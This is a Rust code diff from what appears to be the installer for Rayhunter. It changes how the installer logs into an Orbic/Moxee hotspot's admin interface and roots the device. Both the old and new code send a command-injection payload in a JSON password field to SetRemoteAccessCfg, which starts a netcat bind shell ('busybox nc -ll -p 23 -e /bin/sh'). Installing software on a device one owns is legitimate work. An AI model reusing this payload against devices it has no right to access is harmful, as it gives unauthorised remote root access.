@@ -4,21 +4,11 @@ use std::str::FromStr;
 use std::time::Duration;
 
 use anyhow::{Context, Result, bail};
-use axum::{
-    Router,
-    body::Body,
-    extract::{Request, State},
-    http::uri::Uri,
-    response::{IntoResponse, Response},
-    routing::any,
-};
-use hyper::StatusCode;
-use hyper_util::{client::legacy::connect::HttpConnector, rt::TokioExecutor};
 use reqwest::Client;
 use serde::Deserialize;
-use tokio::sync::mpsc;
 use tokio::time::sleep;
 
+use crate::orbic_auth::{LoginInfo, LoginRequest, LoginResponse, encode_password};
 use crate::util::{echo, telnet_send_command, telnet_send_file};
 use crate::{CONFIG_TOML, RAYHUNTER_DAEMON_INIT};
 
@@ -27,121 +17,133 @@ struct ExploitResponse {
     retcode: u32,
 }
 
-pub async fn start_telnet(admin_ip: &str) -> Result<()> {
-    println!("Waiting for login and trying exploit... ");
-    login_and_exploit(admin_ip).await?;
+async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Result<()> {
+    let client = Client::new();
+
+    // Step 1: Get login info (priKey and session cookie)
+    let login_info_response = client
+        .get(format!("http://{}/goform/GetLoginInfo", admin_ip))
+        .send()
+        .await
+        .context("Failed to get login info")?;
+
+    let session_cookie = login_info_response
+        .headers()
+        .get("set-cookie")
+        .and_then(|cookie| cookie.to_str().ok())
+        .context("No session cookie received")?
+        .split(';')
+        .next()
+        .context("Invalid cookie format")?
+        .to_string();
+
+    let login_info: LoginInfo = login_info_response
+        .json()
+        .await
+        .context("Failed to parse login info")?;
+
+    if login_info.retcode != 0 {
+        bail!("GetLoginInfo failed with retcode: {}", login_info.retcode);
+    }
+
+    // Parse priKey (format: "secret x timestamp")
+    let mut parts = login_info.pri_key.split('x');
+    let secret = parts.next().context("Missing secret in priKey")?;
+    let timestamp = parts.next().context("Missing timestamp in priKey")?;
+    if parts.next().is_some() {
+        bail!("Invalid priKey format: {}", login_info.pri_key);
+    }
+
+    // Step 2: Encode credentials
+    let username_md5 = format!("{:x}", md5::compute(username));
+    let timestamp_start = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs();
+
+    let encoded_password = encode_password(password, secret, timestamp, timestamp_start)
+        .context("Failed to encode password")?;
+
+    let login_request = LoginRequest {
+        username: username_md5,
+        password: encoded_password,
+    };
+
+    // Step 3: Perform login
+    let login_response = client
+        .post(format!("http://{}/goform/login", admin_ip))
+        .header("Content-Type", "application/json")
+        .header("Cookie", &session_cookie)
+        .json(&login_request)
+        .send()
+        .await
+        .context("Failed to send login request")?;
+
+    // Extract authenticated session cookie from login response
+    let authenticated_cookie = login_response
+        .headers()
+        .get("set-cookie")
+        .and_then(|cookie| cookie.to_str().ok())
+        .map(|cookie| cookie.split(';').next().unwrap_or(cookie).to_string())
+        .unwrap_or(session_cookie);
+
+    let login_result: LoginResponse = login_response
+        .json()
+        .await
+        .context("Failed to parse login response")?;
+
+    if login_result.retcode != 0 {
+        bail!("Login failed with retcode: {}", login_result.retcode);
+    }
+
+    // Step 4: Exploit using authenticated session
+    let response: ExploitResponse = client
+        .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
+        .header("Content-Type", "application/json")
+        .header("Cookie", authenticated_cookie)
+        // Original Orbic lacks telnetd (unlike other devices)
+        // When doing this, one needs to set prompt=None in the telnet utility functions
+        .body(r#"{"password": "\"; busybox nc -ll -p 23 -e /bin/sh & #"}"#)
+        .send()
+        .await
+        .context("failed to start telnet")?
+        .json()
+        .await
+        .context("failed to start telnet")?;
+
+    if response.retcode != 0 {
+        bail!("unexpected response while starting telnet: {:?}", response);
+    }
+
+    Ok(())
+}
+
+pub async fn start_telnet(
+    admin_ip: &str,
+    admin_username: &str,
+    admin_password: &str,
+) -> Result<()> {
+    echo!("Logging in and starting telnet... ");
+    login_and_exploit(admin_ip, admin_username, admin_password).await?;
     println!("done");
 
     Ok(())
 }
 
-pub async fn install(admin_ip: String) -> Result<()> {
-    start_telnet(&admin_ip).await?;
+pub async fn install(
+    admin_ip: String,
+    admin_username: String,
+    admin_password: String,
+) -> Result<()> {
+    echo!("Logging in and starting telnet... ");
+    login_and_exploit(&admin_ip, &admin_username, &admin_password).await?;
+    println!("done");
 
     echo!("Waiting for telnet to become available... ");
     wait_for_telnet(&admin_ip).await?;
     println!("done");
 
     setup_rayhunter(&admin_ip).await
-}
-
-type HttpProxyClient = hyper_util::client::legacy::Client<HttpConnector, Body>;
-
-#[derive(Clone)]
-struct ProxyState {
-    client: HttpProxyClient,
-    admin_ip: String,
-    session_sender: mpsc::Sender<String>,
-}
-
-async fn proxy_handler(state: State<ProxyState>, mut req: Request) -> Result<Response, StatusCode> {
-    // Check for existing session cookie in request
-    if let Some(cookie_header) = req.headers().get("cookie")
-        && let Ok(cookie_str) = cookie_header.to_str()
-        && cookie_str.contains("-goahead-session-")
-    {
-        let _ = state.session_sender.send(cookie_str.to_owned()).await;
-    }
-
-    let path_query = req
-        .uri()
-        .path_and_query()
-        .map(|v| v.as_str())
-        .unwrap_or("/");
-    let uri = format!("http://{}{}", state.admin_ip, path_query);
-    *req.uri_mut() = Uri::try_from(uri).unwrap();
-
-    let response = state
-        .client
-        .request(req)
-        .await
-        .map_err(|_| StatusCode::BAD_REQUEST)?;
-    Ok(response.into_response())
-}
-
-async fn login_and_exploit(admin_ip: &str) -> Result<()> {
-    let client = hyper_util::client::legacy::Client::builder(TokioExecutor::new())
-        .build(HttpConnector::new());
-    let (tx, mut rx) = mpsc::channel(100);
-
-    let app = Router::new()
-        .route("/", any(proxy_handler))
-        .route("/{*path}", any(proxy_handler))
-        .with_state(ProxyState {
-            client,
-            admin_ip: admin_ip.to_owned(),
-            session_sender: tx,
-        });
-
-    let listener = tokio::net::TcpListener::bind("127.0.0.1:4000")
-        .await
-        .context("Failed to bind to port 4000")?;
-
-    println!(
-        "Please open http://127.0.0.1:4000 in your browser and log into the device to continue."
-    );
-    println!("Username: admin");
-    println!(
-        "Password: On Verizon Orbic RC400L, use the WiFi password. On Moxee devices, check under the battery."
-    );
-
-    let handle = tokio::spawn(async move { axum::serve(listener, app).await });
-    let exploit_client = Client::new();
-
-    let mut last_error = None;
-
-    while let Some(cookie_header) = rx.recv().await {
-        match start_reverse_shell(&exploit_client, admin_ip, &cookie_header).await {
-            Ok(_) => {
-                handle.abort();
-                return Ok(());
-            }
-            Err(e) => last_error = Some(e),
-        }
-    }
-
-    handle.abort();
-    bail!("Failed to receive session cookie, last error: {last_error:?}")
-}
-
-async fn start_reverse_shell(client: &Client, admin_ip: &str, cookie_header: &str) -> Result<()> {
-    let response: ExploitResponse = client
-        .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
-        .header("Content-Type", "application/json")
-        .header("Cookie", cookie_header)
-        // Original Orbic lacks telnetd (unlike other devices)
-        // When doing this, one needs to set prompt=None in the telnet utility functions
-        .body(r#"{"password": "\"; busybox nc -ll -p 23 -e /bin/sh & #"}"#)
-        .send()
-        .await?
-        .json()
-        .await?;
-
-    if response.retcode != 0 {
-        bail!("unexpected response: {:?}", response);
-    }
-
-    Ok(())
 }
 
 async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
